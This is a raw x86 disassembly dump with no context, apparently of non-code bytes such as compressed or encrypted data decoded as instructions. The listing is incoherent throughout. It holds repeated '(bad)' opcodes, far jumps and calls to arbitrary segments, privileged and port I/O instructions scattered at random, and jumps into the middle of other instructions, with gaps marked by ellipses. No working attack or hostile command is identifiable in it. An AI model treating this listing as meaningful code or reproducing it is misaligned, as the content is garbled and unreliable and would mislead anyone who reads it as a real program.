  424d01:	inc    ebp
  424d02:	sub    esp,edi
  424d04:	pusha  
  424d05:	mov    DWORD PTR [ecx],eax
  424d07:	add    BYTE PTR ds:0xe7000001,al
  424d0d:	adc    DWORD PTR [ebx],0xffffff90
  424d10:	and    bh,dl
  424d12:	push   esi
  424d13:	cmp    DWORD PTR [eax-0x7b3fd9f7],esi
  424d19:	ret    
  424d1a:	sbb    ebx,esi
  424d1c:	push   cs
  424d1d:	out    dx,al
  424d1e:	dec    edi
  424d1f:	addr16 popf 
  424d21:	xlat   BYTE PTR ds:[ebx]
  424d22:	mov    edx,0x6f54e992
  424d27:	imul   ebp,DWORD PTR [eax-0x2a],0x84b9a179
  424d2e:	jle    0x424cd7
  424d30:	fwait
  424d31:	(bad)  
  424d32:	daa    
  424d33:	cmp    BYTE PTR [ebp-0x3],bh
  424d36:	mov    bl,0x38
  424d38:	daa    
  424d39:	sub    al,0x71
  424d3b:	sub    al,bl
  424d3d:	(bad)  [eax]
  424d3f:	inc    esi
  424d40:	(bad)  
  424d42:	inc    esp
  424d43:	mul    bl
  424d45:	and    al,0x7a
  424d47:	xor    cl,bh
  424d49:	idiv   DWORD PTR [esi+0x1e]
  424d4c:	int    0x2f
  424d4e:	mov    ch,0x70
  424d50:	mov    eax,0x34fda8bb
  424d55:	popf   
  424d56:	and    ch,BYTE PTR [ecx]
  424d58:	sbb    eax,0x1dd5498c
  424d5d:	add    ah,BYTE PTR [ebx+0x55e9b3b5]
  424d63:	cmp    ecx,eax
  424d65:	loop   0x424cfd
  424d67:	push   edx
  424d68:	mov    eax,ds:0xda09a131
  424d6d:	data16 sub al,0x22
  424d70:	sub    edx,edx
  424d72:	or     BYTE PTR [ecx+esi*1+0x42cd7fcd],al
  424d79:	jle    0x424d17
  424d7b:	pop    eax
  424d7c:	xor    al,0xe7
  424d7e:	push   es
  424d7f:	or     DWORD PTR [edi-0x1a605f21],ecx
  424d85:	xchg   ebp,eax
  424d86:	or     ch,BYTE PTR [ebx+edx*8]
  424d89:	ret    
  424d8a:	popa   
  424d8b:	push   esi
  424d8c:	mov    bh,BYTE PTR [eax+0xd]
  424d8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d90:	add    dl,bl
  424d92:	and    BYTE PTR [eax+0x4f],bl
  424d95:	sbb    DWORD PTR [eax-0x3b],0xffffff97
  424d99:	lea    ecx,[ebx]
  424d9b:	mov    ebx,0x990f448c
  424da0:	test   DWORD PTR [edi],esi
  424da2:	or     DWORD PTR [edx],0xffffff8b
  424da5:	dec    edi
  424da6:	cmp    edx,DWORD PTR [ebx+0x1bc49232]
  424dac:	mov    bh,0x88
  424dae:	lods   al,BYTE PTR ds:[esi]
  424daf:	sub    al,0xb
  424db1:	int    0xd7
  424db3:	and    bh,BYTE PTR [esi-0x44]
  424db6:	imul   ebx,DWORD PTR [edx],0x62
  424db9:	sbb    al,0xb1
  424dbb:	aaa    
  424dbc:	sbb    ebx,DWORD PTR [esi]
  424dbe:	inc    ebx
  424dbf:	data16 rcl bh,0xc7
  424dc3:	adc    al,0xbc
  424dc5:	xchg   esi,eax
  424dc6:	int    0xb6
  424dc8:	sahf   
  424dc9:	das    
  424dca:	add    DWORD PTR [ebp-0x20],0x8
  424dce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424dcf:	pop    esp
  424dd0:	shl    DWORD PTR [ecx-0x47],cl
  424dd3:	daa    
  424dd4:	rcr    edx,0x72
  424dd7:	push   ebx
  424dd8:	mov    cl,dl
  424dda:	sub    ebp,esp
  424ddc:	imul   esp,DWORD PTR [ecx],0x2f
  424ddf:	mov    eax,ds:0xe4f07d7c
  424de4:	in     al,0xb4
  424de6:	bound  ecx,QWORD PTR [ebx-0x31]
  424de9:	repnz dec ebp
  424deb:	aaa    
  424dec:	mov    bh,0x10
  424dee:	mov    ecx,0xf414478
  424df3:	(bad)
  424df6:	sub    al,0xda
  424df8:	int3   
  424df9:	jae    0x424d96
  424dfb:	in     eax,dx
  424dfc:	stc    
  424dfd:	pushf  
  424dfe:	add    DWORD PTR [edi-0x406c7040],ebp
  424e04:	hlt    
  424e05:	sub    al,0xad
  424e07:	and    al,0x7d
  424e09:	lods   eax,DWORD PTR ds:[esi]
  424e0a:	pop    es
  424e0b:	mov    ch,0xcb
  424e0d:	push   ebp
  424e0e:	sbb    eax,DWORD PTR [esi-0x55]
	...
  424e71:	add    BYTE PTR [eax],al
  424e73:	add    BYTE PTR ds:0xf361d20c,bh
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424eb0
  424e81:	repz shl BYTE PTR [esi+0x65],0x8a
  424e86:	add    DWORD PTR [eax],eax
  424e88:	add    eax,0x47000001
  424e8d:	repnz shl DWORD PTR [edi-0x36],0x9f
  424e92:	and    al,0xc9
  424e94:	jecxz  0x424eb1
  424e96:	shl    BYTE PTR [ebx-0x70],0x80
  424e9a:	push   edx
  424e9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e9c:	aas    
  424e9d:	mov    ebp,0x3cc12329
  424ea2:	scas   al,BYTE PTR es:[edi]
  424ea3:	fimul  DWORD PTR [ebx+ebx*4-0x60]
  424ea7:	aas    
  424ea8:	cmp    ebp,DWORD PTR [eax+0x7ba0886f]
  424eae:	mov    bh,0x26
  424eb0:	xchg   edi,eax
  424eb1:	mov    edi,0x5a2fb690
  424eb6:	lock jns 0x424eab
  424eb9:	add    al,0x5f
  424ebb:	mov    eax,esi
  424ebd:	xchg   edx,eax
  424ebe:	scas   eax,DWORD PTR es:[edi]
  424ebf:	fidivr WORD PTR [ebp-0x35]
  424ec2:	sbb    BYTE PTR [ecx+edx*8+0x5c],bh
  424ec6:	jbe    0x424e58
  424ec8:	ret    0x741e
  424ecb:	adc    ch,BYTE PTR [edi-0x1d]
  424ece:	lods   eax,DWORD PTR ds:[esi]
  424ecf:	fisub  WORD PTR [edi+edi*2]
  424ed2:	push   esi
  424ed3:	dec    esi
  424ed4:	pop    edi
  424ed5:	ficomp DWORD PTR fs:0x10a26762
  424edc:	push   ecx
  424edd:	push   ds
  424ede:	jnp    0x424e94
  424ee0:	es sti 
  424ee2:	add    eax,ecx
  424ee4:	frstor [edx+0x7e65a5d5]
  424eea:	mov    dh,0x66
  424eec:	push   ds
  424eed:	pop    ebp
  424eee:	jge    0x424f08
  424ef0:	retf   
  424ef1:	icebp  
  424ef2:	mov    ah,0xa6
  424ef4:	push   0x78
  424ef6:	jns    0x424f1b
  424ef8:	cli    
  424ef9:	mov    esp,0x2f4e5984
  424eff:	int3   
  424f00:	fst    QWORD PTR [edx+0x5f0ccf02]
  424f06:	cs daa 
  424f08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f09:	xor    BYTE PTR [ecx-0x20],ah
  424f0c:	fwait
  424f0d:	mov    dl,0x26
  424f0f:	icebp  
  424f10:	cmp    BYTE PTR [ecx+esi*1+0x63],bh
  424f14:	mov    gs,WORD PTR [edi+0x17e82601]
  424f1a:	xchg   ebx,eax
  424f1b:	popa   
  424f1c:	and    eax,DWORD PTR [edi]
  424f1e:	adc    eax,0x23b1d010
  424f23:	dec    eax
  424f24:	leave  
  424f25:	or     al,0xf8
  424f27:	add    al,0xec
  424f29:	popf   
  424f2a:	stos   BYTE PTR es:[edi],al
  424f2b:	int    0x2
  424f2d:	mov    ebp,0xd603b373
  424f32:	rcr    BYTE PTR [ebx],cl
  424f34:	lods   eax,DWORD PTR ds:[esi]
  424f35:	inc    ecx
  424f36:	push   0x4a3bbe71
  424f3b:	daa    
  424f3c:	shr    ebx,1
  424f3e:	mov    esp,0xd68ebafb
  424f43:	sub    dh,dl
  424f45:	sbb    esi,DWORD PTR ds:0x34a9878d
  424f4b:	mov    DWORD PTR [ebx],0x8a746e38
  424f51:	mov    dl,BYTE PTR [ebx+edi*8]
  424f54:	jg     0x424f0a
  424f56:	pop    ss
  424f57:	icebp  
  424f58:	sahf   
  424f59:	jae    0x424f5b
  424f5b:	mov    edx,0xa582cb65
  424f60:	mov    ebp,0x7bf40a5a
  424f65:	pusha  
  424f66:	js     0x424f8a
  424f68:	dec    dx
  424f6a:	ja     0x424fba
  424f6c:	jg     0x424ef7
  424f6e:	jp     0x424fc6
  424f70:	mov    ds:0xd8fe3376,al
  424f75:	test   DWORD PTR [ebx-0x7c],ebp
  424f78:	sbb    BYTE PTR [eax+esi*4],0xf5
  424f7c:	adc    cl,dl
  424f7e:	xchg   edx,eax
  424f7f:	or     dl,BYTE PTR [esi-0x7456bb0e]
  424f85:	inc    ebp
  424f86:	fld    QWORD PTR [eax+edi*4+0x382639c0]
  424f8d:	mov    eax,DWORD PTR [edx+0x4f]
  424f90:	das    
	...
  424ff1:	add    BYTE PTR [eax],al
  424ff3:	add    BYTE PTR [ebx+0x16],cl
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	add    al,0x6e
  425002:	add    eax,0x18b6aac
  425007:	add    BYTE PTR ds:0x3c000001,al
  42500d:	lds    ebp,FWORD PTR [esi]
  42500f:	call   0x4d7a:0x823927b8
  425016:	fidiv  DWORD PTR [eax]
  425018:	sub    al,0xd3
  42501a:	inc    edi
  42501b:	xor    al,0x93
  42501d:	sub    BYTE PTR [ebx-0x1a91f65c],0x1f
  425024:	pusha  
  425025:	fnstenv [edi-0x22a9faa6]
  42502b:	nop
  42502c:	push   ebx
  42502d:	fcmovnb st,st(0)
  42502f:	inc    edi
  425030:	sbb    al,bh
  425032:	lea    esi,[edx]
  425034:	das    
  425035:	in     al,0x58
  425037:	jecxz  0x425017
  425039:	adc    eax,0x50d2c889
  42503e:	call   0xbb4adbb9
  425043:	std    
  425044:	adc    BYTE PTR [edi+0x6cce6c93],ch
  42504a:	adc    BYTE PTR [ecx],0x3a
  42504d:	push   eax
  42504e:	pop    es
  42504f:	lods   eax,DWORD PTR ds:[esi]
  425050:	js     0x425093
  425052:	push   0x28df56c6
  425057:	adc    BYTE PTR ds:0x121cc576,al
  42505d:	sbb    BYTE PTR [ebx],bh
  42505f:	jne    0x42509d
  425061:	sahf   
  425062:	outs   dx,DWORD PTR ds:[esi]
  425063:	push   eax
  425064:	xor    BYTE PTR [esi+0x487c4aeb],cl
  42506a:	ja     0x4250d1
  42506c:	ss repz sub esp,ebp
  425070:	mov    dl,0x8c
  425072:	adc    al,0x7b
  425074:	cmp    dl,0xf8
  425077:	in     eax,0xb3
  425079:	fild   QWORD PTR [ebp-0x237358ce]
  42507f:	popa   
  425080:	jmp    0xa0e5:0x78acf51b
  425087:	adc    al,BYTE PTR [edx+0x2b]
  42508a:	mov    ebx,0x2651b413
  42508f:	mov    ebx,0xede5d7ac
  425094:	sbb    DWORD PTR [edi],edi
  425096:	jle    0x425036
  425098:	jb     0x42506f
  42509a:	test   DWORD PTR [ebx],eax
  42509c:	aaa    
  42509d:	arpl   WORD PTR [ebx],bx
  42509f:	neg    BYTE PTR [ecx+ebx*2]
  4250a2:	jmp    0x8ecefce0
  4250a7:	xor    DWORD PTR [edi-0x4832c6ef],ebp
  4250ad:	dec    edx
  4250ae:	test   ch,dh
  4250b0:	shl    BYTE PTR [eax-0x5b],1
  4250b3:	leave  
  4250b4:	ror    DWORD PTR [esi-0x5e0da287],cl
  4250ba:	cdq    
  4250bb:	ins    BYTE PTR es:[edi],dx
  4250bc:	xor    al,dh
  4250be:	cdq    
  4250bf:	aad    0x17
  4250c1:	retf   0x3d3e
  4250c4:	fs cmp dl,cl
  4250c7:	mov    eax,ds:0x880696d6
  4250cc:	dec    edx
  4250cd:	or     eax,0x921e5ed3
  4250d2:	xchg   edi,eax
  4250d3:	cli    
  4250d4:	fcomip st,st(0)
  4250d6:	add    ecx,ecx
  4250d8:	xor    esi,DWORD PTR [edi+ebp*8+0x5f5f68a5]
  4250df:	sbb    DWORD PTR [ebx-0x3],ebx
  4250e2:	push   edi
  4250e3:	sub    BYTE PTR [ebp-0x5a732816],bl
  4250e9:	fistp  WORD PTR [eax+edx*8+0x5e]
  4250ed:	call   0xa1ec:0x66cefc75
  4250f4:	rol    ah,0xfb
  4250f7:	repz or al,0x3b
  4250fa:	push   0x30
  4250fc:	inc    edi
  4250fd:	mov    ebp,0xad31fc70
  425102:	out    dx,al
  425103:	shr    BYTE PTR [esi+0xd],1
  425106:	cmp    BYTE PTR [edx-0x7aed5f71],bh
  42510c:	add    esp,edi
  42510e:	push   esi
  42510f:	jmp    0x0:0x64
	...
  425172:	add    BYTE PTR [eax],al
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0xf22a:0x214e92e8
  425184:	outs   dx,DWORD PTR ds:[esi]
  425185:	mov    WORD PTR [ecx],es
  425187:	add    BYTE PTR ds:0x7d000001,al
  42518d:	pop    ds
  42518e:	xchg   esp,eax
  42518f:	int    0x16
  425191:	adc    DWORD PTR [edi+0x15c6b089],0x68
  425198:	mov    ebx,0xc78a03f2
  42519d:	(bad)  
  42519e:	cmc    
  42519f:	aad    0xfd
  4251a1:	mov    ch,0x6e
  4251a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4251a4:	jmp    0xa583:0x720d21a7
  4251ab:	inc    eax
  4251ac:	mov    al,ds:0xe8b9e6b0
  4251b1:	lods   eax,DWORD PTR gs:[esi]
  4251b3:	jne    0x4251ad
  4251b5:	or     DWORD PTR ds:0x29dc003a,esi
  4251bb:	add    DWORD PTR [edx+ebx*1],ebx
  4251be:	adc    al,0xbd
  4251c0:	sub    cl,BYTE PTR [edi]
  4251c2:	add    al,0xff
  4251c5:	pop    edx
  4251c6:	add    eax,0x2bec2db4
  4251cb:	ja     0x42522f
  4251cd:	pop    edi
  4251ce:	cmc    
  4251cf:	adc    al,0xeb
  4251d1:	scas   eax,DWORD PTR es:[edi]
  4251d2:	and    eax,0xda3eb112
  4251d7:	hlt    
  4251d8:	sahf   
  4251d9:	imul   edx,DWORD PTR [ebx+edx*1-0x4b],0x71
  4251de:	call   0x498b:0x819e8957
  4251e5:	cld    
  4251e6:	inc    ebp
  4251e7:	int3   
  4251e8:	pop    ss
  4251e9:	popa   
  4251ea:	fstp   TBYTE PTR [eax+0x4]
  4251ed:	push   ebx
  4251ee:	imul   ebx,eax,0xcd1d3adc
  4251f4:	mov    BYTE PTR [esp+ecx*8-0x42],ch
  4251f8:	into   
  4251f9:	out    dx,al
  4251fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251fb:	leave  
  4251fc:	sahf   
  4251fd:	sbb    eax,0xefce91cc
  425202:	jbe    0x4251ce
  425204:	cdq    
  425205:	xchg   ebp,eax
  425206:	add    ebx,0x28
  425209:	jge    0x425286
  42520b:	pop    ecx
  42520c:	mov    edx,fs
  42520e:	into   
  42520f:	fwait
  425210:	lea    esp,[ebx-0x2e]
  425213:	sahf   
  425214:	es shl edx,1
  425217:	dec    esi
  425218:	xor    dh,BYTE PTR [esi+ecx*1+0x57]
  42521c:	(bad)  
  42521d:	xchg   ebx,eax
  42521e:	lea    ecx,[ecx+ebp*1-0x6f]
  425222:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425223:	jmp    0x1a2a:0xc60306dc
  42522a:	or     BYTE PTR [edx+eax*2+0x1652d534],dh
  425231:	xlat   BYTE PTR ds:[ebx]
  425232:	add    ah,ch
  425234:	xchg   esi,eax
  425235:	mov    al,ds:0x433d5d06
  42523a:	cmp    al,BYTE PTR [esi-0x36b8d52e]
  425240:	loopne 0x425239
  425242:	das    
  425243:	mov    eax,0x4628f2ad
  425248:	sar    DWORD PTR [ebx],0x94
  42524b:	popf   
  42524c:	dec    ecx
  42524d:	enter  0xfa74,0x66
  425251:	and    al,0x39
  425253:	pop    eax
  425254:	sub    al,BYTE PTR [ecx+0x76]
  425257:	fist   DWORD PTR [edx-0x3f7c5aba]
  42525d:	loop   0x4252a1
  42525f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425260:	jo     0x4252c1
  425262:	lahf   
  425263:	ds cdq 
  425265:	jmp    0x42524f
  425267:	ja     0x4252d5
  425269:	les    edx,FWORD PTR [esi-0x49b98435]
  42526f:	jle    0x425241
  425271:	shl    BYTE PTR [ebx],cl
  425273:	inc    ebp
  425274:	xchg   al,cl
  425276:	pop    esi
  425277:	out    dx,eax
  425278:	daa    
  425279:	jp     0x4252da
  42527b:	jno    0x425249
  42527d:	jmp    ecx
  42527f:	loopne 0x425263
  425281:	call   0xbf3b:0x8d1e0a7c
  425288:	clc    
  425289:	(bad)  
  42528a:	pop    esi
  42528b:	xchg   ecx,eax
  42528c:	adc    al,0x40
  42528e:	xor    eax,0x1e6c
	...
  4252f3:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	(bad)  
  425301:	iret   
  425302:	inc    edx
  425303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425304:	je     0x425293
  425306:	add    DWORD PTR [eax],eax
  425308:	add    eax,0x9c000001
  42530d:	hlt    
  42530e:	repnz test eax,0x71908e90
  425314:	push   edi
  425315:	jne    0x4252cf
  425317:	pop    edi
  425318:	sti    
  425319:	cs add eax,0xc8b3491e
  42531f:	xor    DWORD PTR [ecx],edx
  425321:	daa    
  425322:	mov    esp,0x81a1147c
  425327:	jg     0x4252cf
  425329:	push   ebx
  42532a:	loopne 0x425382
  42532c:	sbb    edi,DWORD PTR ds:0x668b8bd
  425332:	rcr    BYTE PTR [edi+0x68],1
  425335:	adc    BYTE PTR [ebx-0x6b],ch
  425338:	cs leave 
  42533a:	xchg   edx,eax
  42533b:	inc    ebp
  42533c:	inc    edx
  42533d:	cld    
  42533e:	test   bl,0xfc
  425341:	(bad)
  425344:	aaa    
  425345:	nop
  425346:	add    BYTE PTR [edx+0x44],dl
  425349:	mul    eax
  42534b:	add    ch,al
  42534d:	arpl   WORD PTR [esi-0x3b],ax
  425350:	sub    ecx,DWORD PTR [esi+0xd]
  425353:	enter  0xcbc7,0xea
  425357:	push   0x23
  425359:	imul   eax,DWORD PTR [edx+ebx*8],0x8afcd517
  425360:	je     0x425306
  425362:	xchg   BYTE PTR [edx],cl
  425364:	test   BYTE PTR [eax+0x6785e147],ch
  42536a:	neg    edx
  42536c:	test   BYTE PTR [esi-0x1a],bl
  42536f:	into   
  425370:	mov    esp,0x20b4565a
  425375:	adc    al,BYTE PTR [edx-0x6]
  425378:	jb     0x42530e
  42537a:	inc    esi
  42537b:	fisub  WORD PTR [edi+0x486e3c46]
  425381:	outs   dx,DWORD PTR ds:[esi]
  425382:	ins    BYTE PTR es:[edi],dx
  425383:	pop    esp
  425384:	cwde   
  425385:	dec    ebx
  425386:	dec    ecx
  425387:	stos   BYTE PTR es:[edi],al
  425388:	push   esp
  425389:	sub    esp,DWORD PTR [esi]
  42538b:	arpl   WORD PTR [ebx],dx
  42538d:	out    0x42,eax
  42538f:	fist   WORD PTR ss:[ebx]
  425392:	(bad)  
  425393:	fdiv   DWORD PTR [ecx+esi*1+0x55]
  425397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425398:	test   eax,0x92497235
  42539d:	jg     0x425348
  42539f:	(bad)  
  4253a0:	les    eax,FWORD PTR [ebp+0x70]
  4253a3:	mov    eax,ds:0x51930332
  4253a8:	out    0x2,eax
  4253aa:	mov    ecx,DWORD PTR [eax-0x52]
  4253ad:	out    0x2,eax
  4253af:	stc    
  4253b0:	adc    edi,esi
  4253b2:	gs xchg dh,ah
  4253b5:	or     DWORD PTR [edi+edx*4-0x3127fbba],edi
  4253bc:	repnz popa 
  4253be:	mov    al,0x17
  4253c0:	dec    eax
  4253c1:	xchg   esp,eax
  4253c2:	sub    esi,DWORD PTR [eax]
  4253c4:	jl     0x42542c
  4253c6:	xchg   edx,eax
  4253c7:	cmp    ebp,DWORD PTR cs:[ebp-0x8]
  4253cb:	jne    0x4253ee
  4253cd:	ret    0xf349
  4253d0:	xchg   ebp,eax
  4253d1:	sub    esp,esp
  4253d3:	call   0xf7cd:0xff0ca605
  4253da:	cmp    ebx,DWORD PTR [eax]
  4253dc:	ss pop edi
  4253de:	pop    ecx
  4253df:	or     DWORD PTR [eax+eiz*8-0x39],ecx
  4253e3:	add    DWORD PTR [edx-0x6607582b],esi
  4253e9:	jnp    0x4253a2
  4253eb:	xchg   DWORD PTR [ebp-0x44],ebx
  4253ee:	xchg   edi,eax
  4253ef:	call   0x58e9:0xa5baee4
  4253f6:	xor    ebp,DWORD PTR [edx-0x40b7745d]
  4253fc:	out    dx,eax
  4253fd:	rol    dh,0x90
  425400:	icebp  
  425401:	(bad)  
  425402:	mov    ebp,0xc89b85a1
  425407:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425408:	mov    WORD PTR [ecx+0x35],?
  42540b:	add    ebp,edx
  42540d:	push   edi
  42540e:	test   al,0x9e
  425410:	add    BYTE PTR es:[eax],al
	...
  425473:	add    BYTE PTR [edx+0x9],al
  425476:	les    ebp,FWORD PTR [ecx-0x14901231]
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    edi,DWORD PTR [ecx]
  425481:	sti    
  425482:	std    
  425483:	or     bh,BYTE PTR [ecx-0x72]
  425486:	add    DWORD PTR [eax],eax
  425488:	add    eax,0x3d000001
  42548d:	xor    bl,BYTE PTR [ebp+0x2b5a9a68]
  425493:	sub    BYTE PTR [ecx+0x7e],0xa9
  425497:	xor    DWORD PTR ds:0xd6975d05,edi
  42549d:	(bad)  
  42549f:	inc    BYTE PTR [eax+0x3b]
  4254a2:	push   eax
  4254a3:	xchg   edi,eax
  4254a4:	inc    edx
  4254a5:	sti    
  4254a6:	pop    esi
  4254a7:	fisttp QWORD PTR [ebp+0x1709fd49]
  4254ad:	test   DWORD PTR [ebp+0x37],eax
  4254b0:	adc    bh,BYTE PTR [ebp+0x5f]
  4254b3:	sbb    DWORD PTR [eax-0x53],ebp
  4254b6:	(bad)  
  4254b7:	mov    edx,0xfabb2aa9
  4254bc:	push   ebp
  4254bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4254be:	loop   0x425454
  4254c0:	lods   eax,DWORD PTR ds:[esi]
  4254c1:	sbb    eax,0xc6c89a28
  4254c6:	push   ecx
  4254c7:	sahf   
  4254c8:	pushf  
  4254c9:	aas    
  4254ca:	or     DWORD PTR [edi+0x76],ecx
  4254cd:	push   cs
  4254ce:	jge    0x42554f
  4254d0:	jbe    0x425462
  4254d2:	into   
  4254d3:	push   esp
  4254d4:	xor    BYTE PTR [ecx],0x72
  4254d7:	(bad)  
  4254d8:	mov    edx,0xfafe72fa
  4254dd:	and    ebx,DWORD PTR [esi]
  4254df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4254e0:	xlat   BYTE PTR ds:[ebx]
  4254e1:	xchg   edi,eax
  4254e2:	or     ah,BYTE PTR [eax-0x1]
  4254e5:	jle    0x425492
  4254e7:	add    bl,ch
  4254e9:	inc    esp
  4254ea:	add    DWORD PTR [ebx+0xe573743],edi
  4254f0:	into   
  4254f1:	ja     0x42548d
  4254f3:	imul   edx,DWORD PTR [esi-0x1e993cdd],0x5c5ab79e
  4254fd:	cmp    eax,0x7a318c23
  425502:	dec    esp
  425503:	inc    ecx
  425504:	(bad)  
  425505:	adc    al,0x4e
  425507:	mov    ah,0xda
  425509:	jno    0x4254b3
  42550b:	xor    al,0x3b
  42550d:	daa    
  42550e:	or     bh,0xfd
  425511:	mov    al,0xb9
  425513:	sahf   
  425514:	cmp    DWORD PTR [edx],ecx
  425516:	push   edx
  425517:	sahf   
  425518:	cmp    cl,BYTE PTR [esi]
  42551a:	mov    esi,0xaded910f
  42551f:	(bad)  
  425520:	out    dx,al
  425521:	rol    DWORD PTR [ecx-0x50],0xda
  425525:	pop    edx
  425526:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425527:	push   ss
  425528:	test   eax,0x6bc2476b
  42552d:	adc    al,0xec
  42552f:	je     0x425530
  425531:	dec    ebp
  425532:	pop    ebp
  425533:	call   0xac064636
  425538:	xchg   ecx,eax
  425539:	jae    0x4254ed
  42553b:	inc    ecx
  42553c:	or     esp,DWORD PTR [ebx]
  42553e:	dec    esp
  42553f:	push   ss
  425540:	jae    0x4254f5
  425542:	add    DWORD PTR [esi+ebx*8+0x4834aa63],ebp
  425549:	mov    al,0x5c
  42554b:	imul   eax,ecx,0x56
  42554e:	dec    eax
  42554f:	inc    eax
  425550:	fild   DWORD PTR [edx-0x76]
  425553:	iret   
  425554:	and    ebp,edi
  425556:	das    
  425557:	dec    ebx
  425558:	test   DWORD PTR [edi-0x2c],ecx
  42555b:	lock add DWORD PTR [ebx+0x40],edi
  42555f:	xchg   ecx,eax
  425560:	add    BYTE PTR [ebp+0x29],cl
  425563:	in     eax,dx
  425564:	out    0xd9,al
  425566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425567:	inc    esi
  425568:	je     0x4255a4
  42556a:	jmp    0x4255c0
  42556c:	das    
  42556d:	dec    ebp
  42556e:	dec    ecx
  42556f:	cmp    ah,BYTE PTR [ebx]
  425571:	arpl   WORD PTR [esp+ebx*8+0x7ad5ca62],di
  425578:	aad    0xa7
  42557a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42557b:	mov    edi,0x922d1925
  425580:	jno    0x425582
  425582:	neg    DWORD PTR [ebx+0x13]
  425585:	lea    ebx,[ebp-0x3c]
  425588:	aad    0x1
  42558a:	sbb    edx,eax
  42558c:	mov    eax,ds:0x7ca56243
	...
  4255f1:	add    BYTE PTR [eax],al
  4255f3:	add    ah,al
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0x66cdf13a
  425602:	and    al,BYTE PTR [edi]
  425604:	jle    0x425595
  425606:	add    DWORD PTR [eax],eax
  425608:	add    eax,0xe3000001
  42560d:	leave  
  42560e:	test   ch,bh
  425610:	lds    edx,FWORD PTR [di]
  425613:	mov    bl,0xe3
  425615:	out    dx,eax
  425616:	lds    ebx,FWORD PTR [esi]
  425618:	fild   DWORD PTR ds:0xa875edf7
  42561e:	sub    edi,0x37
  425621:	sbb    al,0xb6
  425623:	es pop ecx
  425625:	push   esp
  425626:	sbb    al,BYTE PTR [ecx+0x35]
  425629:	pop    ebx
  42562a:	sbb    al,bl
  42562c:	inc    ebx
  42562d:	cmp    DWORD PTR [edx+0x3c],edi
  425630:	and    al,BYTE PTR [ebx+eiz*2-0x3b]
  425634:	jne    0x42562e
  425636:	stc    
  425637:	cs jmp 0x1cfb:0xcc54be11
  42563f:	mov    edi,0x947ea2e1
  425644:	sbb    eax,0x45fe1374
  425649:	aas    
  42564a:	test   ebp,esp
  42564c:	(bad)  
  42564d:	sub    DWORD PTR [ecx-0x154a441],esp
  425653:	fstp   st(3)
  425655:	std    
  425656:	mov    bh,0xea
  425658:	sub    ecx,DWORD PTR [ebx+0x30]
  42565b:	js     0x4256bd
  42565d:	aam    0x76
  42565f:	into   
  425660:	adc    eax,0x96afa293
  425665:	nop
  425666:	xchg   esp,eax
  425667:	or     al,0x2b
  425669:	or     ebp,DWORD PTR [esi]
  42566b:	scas   al,BYTE PTR es:[edi]
  42566c:	rcl    DWORD PTR [esi],1
  42566e:	popf   
  42566f:	sbb    cl,BYTE PTR [edi]
  425671:	call   0x5459f786
  425676:	mov    ch,0x65
  425678:	xor    DWORD PTR [ebp-0x1311c749],ebp
  42567e:	neg    DWORD PTR [edx+0x24ea974f]
  425684:	push   eax
  425685:	or     eax,0x90596d34
  42568a:	mov    al,ds:0xe8db62b3
  42568f:	jle    0x4256a3
  425691:	mov    ecx,0x5173667
  425696:	pop    esp
  425697:	lahf   
  425698:	dec    esp
  425699:	and    bl,BYTE PTR [ebx+0x23ae8ae3]
  42569f:	(bad)  
  4256a1:	push   esp
  4256a2:	inc    edx
  4256a3:	bound  ebx,QWORD PTR [eax-0x1d9409df]
  4256a9:	cli    
  4256aa:	or     BYTE PTR [eax-0x29],0xe3
  4256ae:	call   0x5c230889
  4256b3:	addr16 mov edx,eax
  4256b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256b7:	or     BYTE PTR [ecx-0x7e0dd608],ch
  4256bd:	sub    BYTE PTR [esi+0x20],dh
  4256c0:	mov    al,ds:0x4090fbc9
  4256c5:	xor    bl,bl
  4256c7:	mov    bl,0xd
  4256c9:	retf   
  4256ca:	fwait
  4256cb:	and    edx,esi
  4256cd:	cmp    al,0xda
  4256cf:	(bad)  
  4256d0:	mov    eax,0xae82028
  4256d5:	adc    eax,0xc2b8d629
  4256da:	jle    0x425677
  4256dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256dd:	jno    0x4256cf
  4256df:	repnz add cl,BYTE PTR [ecx+ebx*2]
  4256e3:	pop    edi
  4256e4:	inc    ebx
  4256e5:	mov    al,ds:0x33b17fdf
  4256ea:	jge    0x4256e8
  4256ec:	scas   eax,DWORD PTR es:[edi]
  4256ed:	dec    edx
  4256ee:	mov    eax,ds:0x5f4c2587
  4256f3:	(bad)  
  4256f4:	sub    eax,0x41de4769
  4256f9:	sbb    eax,0xbc024f75
  4256fe:	ficomp WORD PTR [ebp-0x1780c99e]
  425704:	xrelease mov DWORD PTR [eax+0x5e6b7cd2],esi
  42570b:	push   edx
  42570c:	pop    edi
